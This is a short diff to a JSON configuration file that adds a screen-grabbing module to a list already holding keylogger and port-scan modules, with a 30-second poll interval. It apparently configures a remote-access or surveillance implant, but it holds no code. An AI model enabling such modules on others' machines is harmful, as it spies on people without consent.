@@ -3,7 +3,8 @@
     "modules": [
         "test",
         "keylogger_module",
-        "portscan_module"
+        "portscan_module",
+        "screengrabber_module"
     ],
     "poll_interval": 30
 }
